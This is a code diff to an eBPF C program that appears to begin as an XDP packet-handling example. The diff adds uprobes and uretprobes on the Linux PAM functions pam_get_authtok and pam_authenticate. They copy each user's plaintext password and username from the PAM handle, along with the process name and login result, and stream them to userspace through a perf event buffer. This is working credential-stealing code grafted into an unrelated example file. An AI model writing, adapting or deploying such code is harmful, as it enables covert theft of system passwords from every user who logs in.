@@ -1,6 +1,7 @@
 //go:build ignore
 
 #include "bpf_endian.h"
+#include "bpf_tracing.h"
 #include "common.h"
 #include "linux/tcp.h"
 #include "linux/udp.h"
@@ -94,3 +95,108 @@ done:
 	// Try changing this to XDP_DROP and see what happens!
 	return XDP_PASS;
 }
+
+
+struct pam_handle {
+	char *authtok;
+	// unsigned caller_is;
+	// void *pam_conversation;
+	// char *oldauthtok;
+	// char *prompt;
+	// char *service_name;
+	void *filler[5];
+	char *user;
+	char *rhost;
+	char *ruser;
+	// char *tty;
+	// char *xdisplay;
+	// char *authtok_type;
+	// void *data;
+	// void *env;
+};
+
+
+struct event {
+	u32 pid;
+	u32 result;
+	u8 comm[16];
+	u8 username[80];
+	u8 password[80];
+};
+const struct event *unused __attribute__((unused));
+
+
+struct {
+	__uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
+} events SEC(".maps");
+
+
+struct {
+	__uint(type, BPF_MAP_TYPE_HASH);
+	__uint(max_entries, MAX_MAP_ENTRIES);
+	__uint(key_size, sizeof(u32));
+	__uint(value_size, sizeof(struct pam_handle*));
+} pam_handle_map SEC(".maps");
+
+
+struct {
+	__uint(type, BPF_MAP_TYPE_HASH);
+	__uint(max_entries, MAX_MAP_ENTRIES);
+	__type(key, u32);
+	__type(value, struct event);
+} events_map SEC(".maps");
+
+
+SEC("uprobe/pam_get_authtok")
+int uprobe_pam_get_authtok(struct pt_regs *ctx)
+{
+	if (!PT_REGS_PARM1(ctx))
+		return 0;
+	struct pam_handle* phandle = (struct pam_handle*)PT_REGS_PARM1(ctx);
+	u32 pid = bpf_get_current_pid_tgid() >> 32;
+	bpf_map_update_elem(&pam_handle_map, &pid, &phandle, BPF_ANY);
+	return 0;
+};
+
+
+SEC("uretprobe/pam_get_authtok")
+int uretprobe_pam_get_authtok(struct pt_regs *ctx)
+{
+	u32 pid = bpf_get_current_pid_tgid() >> 32;
+	void *pam_handle_ptr = bpf_map_lookup_elem(&pam_handle_map, &pid);
+	if (!pam_handle_ptr)
+		return 0;
+
+	struct pam_handle* phandle = 0;
+	bpf_probe_read(&phandle, sizeof(phandle), pam_handle_ptr);
+
+	u64 password_addr = 0;
+	bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);
+	u64 username_addr = 0;
+	bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);
+
+	struct event event_i;
+	event_i.pid = pid;
+	event_i.result = 100;
+	bpf_probe_read(&event_i.password, sizeof(event_i.password), (void *)password_addr);
+	bpf_probe_read(&event_i.username, sizeof(event_i.username), (void *)username_addr);
+	bpf_get_current_comm(&event_i.comm, sizeof(event_i.comm));
+	bpf_map_update_elem(&events_map, &pid, &event_i, BPF_ANY);
+	return 0;
+};
+
+
+SEC("uretprobe/pam_authenticate")
+int uretprobe_pam_authenticate(struct pt_regs *ctx)
+{
+	u32 pid = bpf_get_current_pid_tgid() >> 32;
+	void *event_ptr = bpf_map_lookup_elem(&events_map, &pid);
+	if (!event_ptr)
+		return 0;
+
+	struct event event_i;
+	bpf_probe_read(&event_i, sizeof(event_i), event_ptr);
+	event_i.result = PT_REGS_RC(ctx);
+	bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event_i, sizeof(event_i));
+	return 0;
+};
